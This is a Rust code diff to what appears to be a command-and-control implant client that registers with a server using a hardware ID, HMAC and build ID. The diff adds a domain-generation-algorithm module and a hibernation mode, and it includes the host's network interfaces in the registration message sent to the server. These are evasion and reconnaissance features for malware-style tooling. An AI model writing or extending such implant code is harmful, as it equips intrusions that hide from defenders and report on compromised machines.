@@ -13,6 +13,8 @@ pub mod artifacts;
 pub mod http_transport;
 pub mod fallback;
 pub mod syscalls;
+pub mod hibernation;
+pub mod dga;
 
 use tokio::sync::mpsc;
 use std::sync::{Arc, Mutex};
@@ -205,6 +207,11 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
         println!("[*] Client Started. ID: {}", hwid);
     }
 
+    // ── Hibernation mode dispatch ──────────────────────────────────────
+    if config.hibernation_mode {
+        return hibernation::run_hibernation(config, hwid, exe_id, verify_key).await;
+    }
+
     // ── HTTP(S) Transport Mode ─────────────────────────────────────────
     if config.transport == crate::common::TransportProtocol::Http
         || config.transport == crate::common::TransportProtocol::Https
@@ -299,6 +306,9 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
                 build_id: config.build_id.clone(),
                 auth_hmac,
                 reg_timestamp: reg_ts,
+                interfaces: crate::utils::get_network_interfaces(),
+                hibernation_mode: false,
+                task_batch_size: config.task_batch_size,
             };
             if let Ok(j) = serde_json::to_vec(&hello) { let _ = tx.send(j).await; }
 
@@ -478,6 +488,9 @@ async fn run_http_mode(
         build_id: config.build_id.clone(),
         auth_hmac,
         reg_timestamp: reg_ts,
+        interfaces: crate::utils::get_network_interfaces(),
+        hibernation_mode: false,
+        task_batch_size: config.task_batch_size,
     };
 
     let mut fb_mgr = fallback::FallbackManager::from_config(&config);
